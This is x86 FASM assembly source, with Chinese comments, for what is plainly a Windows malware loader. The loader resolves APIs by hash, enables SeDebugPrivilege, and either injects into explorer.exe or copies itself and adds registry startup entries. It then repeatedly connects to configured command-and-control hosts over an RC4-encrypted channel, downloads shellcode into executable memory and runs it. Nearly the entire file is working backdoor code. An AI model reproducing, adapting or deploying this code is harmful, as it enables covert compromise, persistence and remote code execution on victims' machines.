include '../include/global.inc'
include 'win32a.inc'

use32

; 修复api

; 拷贝config到全局

; 修复额外函数

proc loader_main uses esi edi ebx
	locals
		global_data	global_data_t	?
	endl

	; 清空globaldata
	cld
	xor al, al
	mov ecx, sizeof.global_data_t
	lea edi, [global_data]
	rep stosb

	; 初始化dll句柄
	mov eax, [fs:0x30]
	mov eax, [eax + 0x0c]
	mov eax, [eax + 0x14]
	mov eax, [eax]

	push dword [eax + 0x10]
	pop [global_data.ntdll]

	mov eax, [eax]
	push dword [eax + 0x10]
	pop [global_data.kernel32]

	; 获取GetProcAddress与LoadLibraryA地址
	push 0
	PUSH_HASH GetProcAddress
	push dword [eax + 0x10]
	call get_proc_from_hash
	mov [global_data.GetProcAddress], eax

	push eax
	PUSH_HASH LoadLibraryA
	push [global_data.kernel32]
	call get_proc_from_hash
	mov [global_data.LoadLibraryA], eax

    PUSH_ANSI_STRING 'advapi32'
    call [global_data.LoadLibraryA]
    mov [global_data.advapi32], eax

    call .push_api_table

	API_HASH_TABLE kernel32,\
		GetCurrentProcess, CloseHandle, OpenProcess, lstrlenA, lstrlenW, lstrcatW, lstrcpyA, lstrcpyW, lstrcmpiW,\
		HeapAlloc, HeapReAlloc, HeapFree, GetProcessHeap, GetModuleHandleA, GetModuleFileNameW, CreateMutexA, GetLastError, Sleep,\
		VirtualAllocEx, VirtualFreeEx, WriteProcessMemory, WaitForSingleObject, CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,\
		ExpandEnvironmentStringsW, CreateProcessW, CreateRemoteThread, GetSystemDirectoryW, GetWindowsDirectoryW, CopyFileW, DeleteFileW

	API_HASH_TABLE ntdll,\
		RtlZeroMemory, RtlMoveMemory, RtlCompressBuffer, RtlGetCompressionWorkSpaceSize, RtlDecompressBuffer

	API_HASH_TABLE advapi32,\
		OpenProcessToken, LookupPrivilegeValueA, AdjustTokenPrivileges, RegOpenKeyExA, RegCreateKeyExW, RegSetValueExW, RegQueryValueExW, RegCloseKey
	
	API_HASH_TABLE_END

.push_api_table:
	pop esi

	assume esi: api_hash_t

	mov edi, [global_data.GetProcAddress]
	.while word [esi] <> 0
		movzx ecx, [esi.lib_offset]
		stdcall get_proc_from_hash, [global_data + ecx], [esi.hash], edi
		movzx ecx, [esi.save_offset]
		mov [global_data + ecx], eax
		add esi, sizeof.api_hash_t
	.endw

	call @@1
@@1:
	add dword [esp], config_data - @@1
	pop esi
	
	lea edi, [global_data]

	assume esi: config_t

	.while word [esi] <> 0
		movzx eax, [esi.save_offset]
		add eax, edi
		movzx ebx, [esi.size]
		add esi, sizeof.config_t
		invoke global_data.RtlMoveMemory, eax, esi, ebx
		add esi, ebx
	.endw
	; 跳过结束标志
	add esi, 2

	; 修复额外的函数
	assume esi: function_data_t

	.while word [esi] <> 0
		movzx eax, [esi.save_offset]
		add eax, edi
		movzx ebx, [esi.func_size]
		add esi, sizeof.function_data_t
		mov [eax], esi
		mov word [eax + 8], bx
		add esi, ebx
	.endw

	lea esi, [global_data]

    assume esi: global_data_t
    
	call fix_base_function

    ; 获取wow64 cs = 0x23 is wow64, 0x1b is win32
    mov ax, cs
    cmp ax, 0x23
    sete byte [global_data.is_wow64] 

    call enable_debug_privilege

    ; 获取loader路径
    invoke global_data.GetModuleHandleA
    lea ecx, [global_data.loader_path]
    invoke global_data.GetModuleFileNameW, eax, ecx, 256

    .if (byte [global_data.inject_to_custom] = true) | (byte [global_data.inject_to_ie] = true)
        ; 注入到explorer
        push thread_main_size
        call .delta
    .delta:
        add dword [esp], thread_main - .delta
        PUSH_WIDE_STRING 'explorer.exe'
        push esi
        call [global_data.inject_to_explorer]
    .else
        ; 创建互斥体
        lea eax, [global_data.mutex_name]
        invoke global_data.CreateMutexA, eax
        test eax, eax
        jz .ret

        invoke global_data.GetLastError
        cmp eax, ERROR_ALREADY_EXISTS
        je .ret

        mov edi, eax

        ; 拷贝自身
        .if byte [global_data.copy_method] <> 0
            invoke global_data.copy_self_x86, esi
        .endif

        ; 增加启动项
        .if byte [global_data.startup_hklm] <> 0
            invoke global_data.add_startup_hklm_x86, esi
        .endif

        .if byte [global_data.startup_acitvex] <> 0
            invoke global_data.add_startup_activex_x86, esi
        .endif

        stdcall thread_main, esi

        invoke global_data.CloseHandle, edi
    .endif

.ret:
    ret
endp

loader_main_size = $ - loader_main ; 防止被优化掉

proc thread_main stdcall uses esi edi, global_data: dword
    mov esi, [global_data]

    assume esi: global_data_t

    ; 修复基本函数
    call fix_base_function

    ; 重新加载下advapi32，防止目标进程没有加载
    PUSH_ANSI_STRING 'advapi32'
    call [esi.LoadLibraryA]

    ; 修复ws2_32
    PUSH_ANSI_STRING 'ws2_32'
    call [esi.LoadLibraryA]
    mov [esi.ws2_32], eax

    call .ws2_32
    
    API_HASH_TABLE ws2_32,\
        WSAStartup, WSACleanup, htons, inet_addr, gethostbyname, socket, closesocket, connect, setsockopt, send, recv, select
    
    API_HASH_TABLE_END
    
.ws2_32:
    pop edi

    assume edi: api_hash_t

    .while word [edi] <> 0
        movzx ecx, [edi.lib_offset]
        stdcall get_proc_from_hash, [esi + ecx], [edi.hash], [esi.GetProcAddress]
        movzx ecx, [edi.save_offset]
        mov [esi + ecx], eax
        add edi, sizeof.api_hash_t
    .endw

    call enable_debug_privilege
    call socket_main
endp

proc socket_main
    locals
        wsa             WSADATA         ?
        s               _SOCKET         ?
        packet_header   packet_header_t ?
        shellcode_main  dd              ?
    endl

    assume esi: global_data_t

    lea eax, [wsa]
    invoke esi.WSAStartup, 0x0202, eax

    lea ebx, [esi.dns_list]             ; ebx = dns_list

.loop_connect:
    invoke esi.lstrlenA, ebx            ; eax = host len
    movzx edx, word [ebx + eax + 1]     ; edx = port

    lea ecx, [ebx + eax + 3]
    push ecx                            ; 保存下一个地址

    .if byte [esi.socks5] = true
        invoke esi.connect_by_socks5, ebx, edx
    .else
        stdcall connect_server, ebx, edx
    .endif

    cmp eax, SOCKET_ERROR
    je .next_host

    mov [s], eax
    
    ; 初始化rc4 sbox
    lea edi, [esi.rc4_key]
    invoke esi.lstrlenA, edi
    push eax

    push eax
    push edi
    lea ecx, [esi.send_sbox]
    push ecx
    call rc4_init

    push edi
    lea ecx, [esi.recv_sbox]
    push ecx
    call rc4_init

    xor edi, edi

    ; 初始化packet_header
    rdtsc
    mov [packet_header.random], eax
    mov [packet_header.signature], PACKET_HEADER_SIGNATURE
    mov [packet_header.cmd], CMD_SHELLCODE_MAIN
    mov [packet_header.packet_unpacked_size], 0
    mov [packet_header.packet_size], 0

    ; 加密
    lea ebx, [packet_header]
    lea ecx, [esi.send_sbox]
    stdcall rc4_crypt, ecx, ebx, sizeof.packet_header_t

    ; 发送请求
    stdcall send_data, esi, [s], ebx, sizeof.packet_header_t
    cmp eax, SOCKET_ERROR
    je .next_host_closesocket

    ; 等待接收数据
    stdcall wait_buffer, esi, [s], WAIT_TIMEOUT, 0
    cmp eax, 0
    jle .next_host_closesocket

    ; 接收包头
    stdcall recv_data, esi, [s], ebx, sizeof.packet_header_t
    cmp eax, SOCKET_ERROR
    je .next_host_closesocket

    ; 解密包头
    lea ecx, [esi.recv_sbox]
    stdcall rc4_crypt, ecx, ebx, sizeof.packet_header_t

    ; 判断数据包
    .if (dword [packet_header.signature] = PACKET_HEADER_SIGNATURE) & (byte [packet_header.cmd] = CMD_SHELLCODE_MAIN)
        stdcall alloc_memory, esi, [packet_header.packet_size]
        mov edi, eax

        stdcall recv_data, esi, [s], eax, [packet_header.packet_size]
        cmp eax, SOCKET_ERROR
        je .next_host_closesocket

        lea ecx, [esi.recv_sbox]
        stdcall rc4_crypt, ecx, edi, [packet_header.packet_size]

    .alloc_next:
        stdcall alloc_executable_memory, esi, 0, [packet_header.packet_unpacked_size]
        cmp eax, 0
        je .alloc_next

        mov [shellcode_main], eax

        mov eax, [packet_header.packet_size]
        .if [packet_header.packet_unpacked_size] = eax
            invoke esi.RtlMoveMemory, [shellcode_main], edi, [packet_header.packet_size]
        .else
            stdcall decompress, esi, edi, [packet_header.packet_size], [shellcode_main], [packet_header.packet_unpacked_size]
            .if eax = 0
                stdcall free_executable_memory, esi, 0, [shellcode_main]
                mov [shellcode_main], 0
            .endif
        .endif

        .if [shellcode_main] <> 0
            invoke shellcode_main, esi, [s]
            stdcall free_executable_memory, esi, 0, [shellcode_main]
            mov [shellcode_main], 0
        .endif
    .endif

.next_host_closesocket:
    .if edi <> 0
        stdcall free_memory, esi, edi
    .endif

    invoke esi.closesocket, [s]

.next_host:
    pop ebx
    .if byte [ebx] = 0
        lea ebx, [esi.dns_list]
    .endif

    invoke esi.Sleep, CONNECT_INTERVAL
    jmp .loop_connect

.ret:
    invoke esi.WSACleanup
    ret
endp

; 修复基本函数
proc fix_base_function uses esi
	mov edi, esi
	add edi, BASE_FUNCTION_START
	call .push_base_function_table
	BASE_FUNCTION_TABLE get_proc_from_hash,\
		rc4_init, rc4_crypt,\
		alloc_memory, realloc_memory, free_memory, alloc_executable_memory, free_executable_memory,\
		compress, decompress,\
		wait_buffer, recv_data, send_data,\
		connect_server
.push_base_function_table:
	pop esi
	xor ecx, ecx
	.while ecx < BASE_FUNCTION_COUNT
		xor eax, eax
		lodsw
		lea eax, [esi + eax]
		stosd
		inc ecx
	.endw

	ret
endp

; 提升进程权限
proc enable_debug_privilege
	locals
		token	_HANDLE				?
		tkp		TOKEN_PRIVILEGES	?
	endl

	assume esi: global_data_t

	invoke esi.GetCurrentProcess

	lea ecx, [token]
	invoke esi.OpenProcessToken, eax, TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, ecx
	.if eax
		lea ecx, [tkp.Privileges.Luid]
		push ecx
		PUSH_ANSI_STRING 'SeDebugPrivilege'
		push 0
		call [esi.LookupPrivilegeValueA]
		.if eax
			mov [tkp.PrivilegeCount], 1
			mov [tkp.Privileges.Attributes], SE_PRIVILEGE_ENABLED
			lea ecx, [tkp]
			invoke esi.AdjustTokenPrivileges, [token], false, ecx, sizeof.TOKEN_PRIVILEGES, 0, 0
		.endif

		invoke esi.CloseHandle, [token]
	.endif

	ret
endp

; 基础函数
; ======================================================================================================================

; get_proc_from_hash
proc get_proc_from_hash stdcall uses ebx esi edi, module_handle: dword, func_hash: dword, get_proc:dword
    locals
        address_functions      dd  ?
        address_name_ords      dd  ?
        address_names          dd  ?
    endl
    
    mov ecx, [module_handle]
    mov edx, [ecx + 0x3c]
    
    mov eax, [edx + ecx + 0x78]		; export rva
    test eax, eax
    jz .not_found
    
    cmp dword [edx + ecx + 0x7c], 0	; check export dict
    jz .not_found
    
    mov ebx, [eax + ecx + 0x18]		; number of names
    test ebx, ebx
    jz .not_found
    
    mov edx, [eax + ecx + 0x1c]
    add edx, ecx
    mov [address_functions], edx
    
    mov esi, [eax + ecx + 0x20]
    add esi, ecx
    mov [address_names], esi
    
    mov eax, [eax + ecx + 0x24]
    add eax, ecx
    mov [address_name_ords], eax
    
    xor edx, edx    ; counter
.next_function:
    mov edi, [esi + edx * 4]
    xor esi, esi
    add edi, ecx
    
    mov al, [edi]
    test al, al
    jz .calc_finish
    
    mov ecx, edi
.calc_hash:
    imul esi, 131
    movsx eax, al
    add esi, eax
    inc ecx
    
    mov al, [ecx]
    test al, al
    jnz .calc_hash
    mov ecx, [module_handle]

.calc_finish:
    and esi, 0x7fffffff
    cmp esi, [func_hash]
    jz .found
    
    mov esi, [address_names]
    inc edx
    cmp edx, ebx
    jb .next_function
    
.not_found:
    xor eax, eax
    
.ret:
    ret
    
.found:
    cmp [get_proc], 0
    jnz .get_proc
    
    mov eax, [address_name_ords]
    movzx eax, word [eax + edx * 2]
    mov edx, [address_functions]
    mov eax, [edx + eax * 4]
    add eax, ecx
    jmp .ret
    
.get_proc:
    push edi
    push ecx
    call [get_proc]
    jmp .ret   
endp

; 偷个懒直接用vs生成
; proc rc4_init stdcall uses esi edi ebx, sbox: dword, key: dword, key_len: dword
rc4_init:
	file 'rc4_init.bin'

; proc rc4_crypt stdcall uses esi edx ebx, sbox: dword, buf: dword, buf_len: dword
rc4_crypt:
	file 'rc4_crypt.bin'

; 申请内存
proc alloc_memory stdcall uses esi edi, global_data: dword, size: dword
    mov esi, [global_data]
    
    assume esi: global_data_t
    
    invoke esi.GetProcessHeap
    mov edi, eax
    xor eax, eax
    .while eax = 0
        invoke esi.HeapAlloc, edi, HEAP_ZERO_MEMORY, [size]
    .endw
    
    ret
endp

; 重新申请内存
proc realloc_memory stdcall uses esi edi, global_data: dword, data: dword, nsize: dword
    mov esi, [global_data]
    
    assume esi: global_data_t
    
    .if [data] = 0
        invoke esi.alloc_memory, esi, [nsize]
    .else
        invoke esi.GetProcessHeap
        mov edi, eax
        xor eax, eax
        .while eax = 0
            invoke esi.HeapReAlloc, edi, HEAP_ZERO_MEMORY, [data], [nsize]
        .endw
    .endif
    ret
endp

; 释放内存
proc free_memory stdcall uses esi, global_data: dword, data: dword
    mov esi, [global_data]
    
    assume esi: global_data_t
    
    invoke esi.GetProcessHeap
    invoke esi.HeapFree, eax, 0, [data]
    
    ret    
endp

; 申请可执行内存
proc alloc_executable_memory stdcall uses esi, global_data: dword, process: dword, size: dword
    mov esi, [global_data]
    
    assume esi: global_data_t
    
    .if [process] = 0
        invoke esi.GetCurrentProcess
        mov [process], eax
    .endif
    
    invoke esi.VirtualAllocEx, [process], 0, [size], MEM_COMMIT, PAGE_EXECUTE_READWRITE
    ret
endp

; 释放可执行内存
proc free_executable_memory stdcall uses esi, global_data: dword, process: dword, base: dword
    mov esi, [global_data]
    
    assume esi: global_data_t
    
    .if [process] = 0
        invoke esi.GetCurrentProcess
        mov [process], eax
    .endif
    
    invoke esi.VirtualFreeEx, [process], [base], 0, MEM_RELEASE
    ret        
endp

; if fail return zero else return compressed size
proc compress stdcall uses esi edi, global_data: dword, src: dword, src_len: dword, dest: dword, dest_len: dword
    locals
        compressed_size         dd  ?
        compress_work_size      dd  ?
        compress_fragment_size  dd  ?
        
    endl
    
    mov esi, [global_data]
    
    assume esi: global_data_t
    
    lea eax, [compress_work_size]
    lea ecx, [compress_fragment_size]
    invoke esi.RtlGetCompressionWorkSpaceSize, COMPRESSION_FORMAT_LZNT1 or COMPRESSION_ENGINE_STANDARD, eax, ecx
    invoke esi.alloc_memory, esi, [compress_work_size]
    mov edi, eax
    
    lea eax, [compressed_size]
    invoke esi.RtlCompressBuffer, COMPRESSION_FORMAT_LZNT1 or COMPRESSION_ENGINE_STANDARD, [src], [src_len], [dest], [dest_len], 0, eax, edi
    
    invoke esi.free_memory, esi, edi
    
    .if eax, ge, 0
        mov eax, [compressed_size]
    .else
        xor eax, eax
    .endif    
    
    ret
endp

; if fail return zero else return compressed size
proc decompress stdcall uses esi, global_data: dword, src: dword, src_len: dword, dest: dword, dest_len: dword
    locals
        uncompressed_size dd  ?
    endl
    
    mov esi, [global_data]
    
    assume esi: global_data_t
    
    lea eax, [uncompressed_size]
    invoke esi.RtlDecompressBuffer, COMPRESSION_FORMAT_LZNT1 or COMPRESSION_ENGINE_STANDARD, [dest], [dest_len], [src], [src_len], eax
    
    .if eax, ge, 0
        mov eax, [uncompressed_size]
    .else
        xor eax, eax
    .endif
    
    ret    
endp

; wait buffer come in, if timeout return 0, if error return SOCKET_ERROR
proc wait_buffer stdcall uses esi, global_data: dword, s: dword, seconds: dword, microsecond: dword
    locals
        fds FD_SET  ?
        tv  TIMEVAL ?
    endl
    
    mov esi, [global_data]
    
    assume esi: global_data_t
    
    mov [fds.fd_count], 1
    push dword [s]
    pop dword [fds.fd_array]
    
    xor edx, edx
    .if ([seconds] <> 0xffffffff)
        push dword [seconds]
        pop dword [tv.tv_sec]
        push dword [microsecond]
        pop dword [tv.tv_usec]
        lea edx, [tv]
    .endif
    
    lea eax, [fds]
    invoke esi.select, 0, eax, 0, 0, edx
    
    ret
endp

; recv data from server
proc recv_data stdcall uses esi ebx, global_data: dword, s: dword, buf: dword, size: dword
    mov esi, [global_data]
    
    mov ebx, [size]
    
    .while [size] > 0
        invoke esi.recv, [s], [buf], [size], 0
        cmp eax, 0
        jle .error_exit
        
        add [buf], eax
        sub [size], eax
    .endw
    
    mov eax, ebx
    
.ret:
    ret

.error_exit:
    mov eax, SOCKET_ERROR
    jmp .ret    
endp

; send data to server
proc send_data stdcall uses esi ebx, global_data: dword, s: dword, buf: dword, size: dword
    mov esi, [global_data]
    
    assume esi: global_data_t
    
    mov ebx, [size]
    
    .while [size] > 0
        invoke esi.send, [s], [buf], [size], 0
        cmp eax, 0
        jle .error_exit
        
        add [buf], eax
        sub [size], eax
    .endw
    
    mov eax, ebx
    
.ret:    
    ret
    
.error_exit:
    mov eax, SOCKET_ERROR
    jmp .ret
endp

; connect to server direct
proc connect_server stdcall uses edi ebx, server: dword, port: dword
    locals
        addr_in sockaddr_in ?
        opt     _DWORD  ?
    endl
    
    assume esi: global_data_t
    
    invoke esi.socket, AF_INET, SOCK_STREAM, 0
       
    cmp eax, SOCKET_ERROR
    je .ret
    
    mov ebx, eax
    
    mov [addr_in.sin_family], AF_INET
    invoke esi.htons, dword [port]
    mov [addr_in.sin_port], ax
    invoke esi.inet_addr, [server]
    mov [addr_in.sin_addr], eax
    
    .if eax = INADDR_NONE
        invoke esi.gethostbyname, [server]
        
        test eax, eax
        jz .close_and_ret_error
        
        assume eax: hostent
        
        mov eax, [eax.h_addr_list]
        mov eax, [eax]
        push dword [eax]
        pop dword [addr_in.sin_addr]
    .endif
    
    lea eax, [addr_in]
    invoke esi.connect, ebx, eax, sizeof.sockaddr_in
    
    cmp eax, SOCKET_ERROR
    je .close_and_ret_error

    lea edi, [opt]
            
    mov [opt], MAX_BUFFER_SIZE
    invoke esi.setsockopt, ebx, SOL_SOCKET, SO_RCVBUF, edi, sizeof._DWORD
    
    mov [opt], RECV_TIMEOUT
    invoke esi.setsockopt, ebx, SOL_SOCKET, SO_RCVTIMEO, edi, sizeof._DWORD
    
    mov [opt], SEND_TIMEOUT
    invoke esi.setsockopt, ebx, SOL_SOCKET, SO_SNDTIMEO, edi, sizeof._DWORD
    
    mov eax, ebx
    
.ret:
    ret
    
.close_and_ret_error:
    invoke esi.closesocket, ebx
    mov eax, SOCKET_ERROR
    jmp .ret
endp

; ======================================================================================================================
thread_main_size = $ - thread_main

config_data: